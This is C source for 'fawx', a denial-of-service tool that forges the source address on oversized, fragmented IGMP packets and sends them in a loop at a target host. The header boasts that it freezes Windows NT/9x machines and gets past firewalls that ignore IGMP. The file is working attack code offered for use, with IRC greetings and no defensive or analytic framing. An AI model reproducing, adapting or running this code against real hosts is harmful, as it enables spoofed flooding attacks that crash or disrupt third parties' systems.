/* fawx.c v1 by ben-z -- igmp-8+frag attack for linux *
 *   thanks to datagram for ssping.c - helped lots    *
 * -------------------------------------------------- *
 * DESCRIPTION:                                       *
 *  Sends oversized fragmented IGMP packets to a box  *
 *  either making it freeze (WinNT/9x), or lagging    *
 *  it to hell and back. Since most win32 firewalls   *
 *  dont support IGMP, the attack successfully        *
 *  penetrates into the system, making it much more   *
 *  effective than an ICMP attack which is likely to  *
 *  be filtered.                                      *
 * GREETINGS:                                         *
 *  mad props to datagram for writing ssping, also    *
 *  thanks to #fts(2) on undernet and the psychic     *
 *  crew on efnet. shouts to ka0z, cyrus, magicfx,    *
 *  ice-e, zeronine, soupnazi, benito, eklipz, c0s,   *
 *  metalman, chawp, folk, atomic-, dethwish, sindawg *
 *  mosthated, and everyone on irc.slacknet.org..     */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netdb.h>
#include "../include/in.h"
#include "../include/ip.h"
#include "../include/ip_icmp.h"
#include "../include/igmp.h"

void banner(void) {
   printf(" -----------------------------------------------\n");	
   printf("| fawx v1 by ben-z: igmp-8+frag spoofing attack |\n");
   printf(" -----------------------------------------------\n");
}

void usage(const char *progname) {

     printf("[**] syntax: %s <spoof host> <target host> <number>\n",progname);

}

int resolve( const char *name, unsigned int port, struct sockaddr_in *addr ) {

   struct hostent *host;

   memset(addr,0,sizeof(struct sockaddr_in));

   addr->sin_family = AF_INET;
   addr->sin_addr.s_addr = inet_addr(name);

   if (addr->sin_addr.s_addr == -1) {
      if (( host = gethostbyname(name) ) == NULL )  {
         fprintf(stderr,"\nuhm.. %s doesnt exist :P\n",name);
         return(-1);
      }
      addr->sin_family = host->h_addrtype;
      memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);
   }

   addr->sin_port = htons(port);
   return(0);

}

unsigned short in_cksum(addr, len)
    u_short *addr;
    int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
 
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }
 
    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }
 
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);		
    answer = ~sum;		
    return(answer);
}

int send_fawx(int socket,
                 unsigned long spoof_addr,
                 struct sockaddr_in *dest_addr) {

   unsigned char  *packet;
   struct iphdr   *ip;
   struct igmphdr *igmp;
   int rc;

        
   packet = (unsigned char *)malloc(sizeof(struct iphdr) +
                        	    sizeof(struct igmphdr) + 8);

   ip = (struct iphdr *)packet;
   igmp = (struct igmphdr *)(packet + sizeof(struct iphdr));

   memset(ip,0,sizeof(struct iphdr) + sizeof(struct igmphdr) + 8);
   
   ip->ihl      = 5;
   ip->version  = 4;
   ip->id       = htons(34717);
   ip->frag_off |= htons(0x2000);
   ip->ttl      = 255;
   ip->protocol = IPPROTO_IGMP;
   ip->saddr    = spoof_addr;
   ip->daddr	= dest_addr->sin_addr.s_addr;
   ip->check    = in_cksum(ip, sizeof(struct iphdr));


   igmp->type     	   = 8;
   igmp->code     	   = 0;

   if (sendto(socket,
              packet,
              sizeof(struct iphdr) +
              sizeof(struct igmphdr) + 1,0,
              (struct sockaddr *)dest_addr,
              sizeof(struct sockaddr)) == -1) { return(-1); }
   

   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct igmphdr) + 8);
   ip->frag_off = htons(8 >> 3);
   ip->frag_off |= htons(0x2000);
   ip->check    = in_cksum(ip, sizeof(struct iphdr));

   igmp->type = 0;
   igmp->code = 0;

   if (sendto(socket,
              packet,
              sizeof(struct iphdr) +
              sizeof(struct igmphdr) + 8,0,
              (struct sockaddr *)dest_addr,
              sizeof(struct sockaddr)) == -1) { return(-1); }

   free(packet);
 /*  printf(".");  <- it looked way too ugly :P */
   return(0);

}

int fawx_main(int argc, char * *argv) {

   struct sockaddr_in dest_addr;
   unsigned int i,sock;
   unsigned long src_addr;

   banner();
   if ((argc != 4)) {
      usage(argv[0]);
      return(-1);
   }
   
   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) { 
      fprintf(stderr,"error opening raw socket. <got root?>\n");
      return(-1);
   }
   
   if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); }
   src_addr = dest_addr.sin_addr.s_addr;

   if (resolve(argv[2],0,&dest_addr) == -1) { return(-1); }

   printf("[**] sending igmp-8+frag attacks to: %s.",argv[2]);
   for (i = 0;i < atoi(argv[3]);i++) {
      if (send_fawx(sock,
                       src_addr,
                       &dest_addr) == -1) {
         fprintf(stderr,"error sending packet. <got root?>\n");
         return(-1);
      }
      usleep(10000);
    }
printf(" *eof*\n");
}
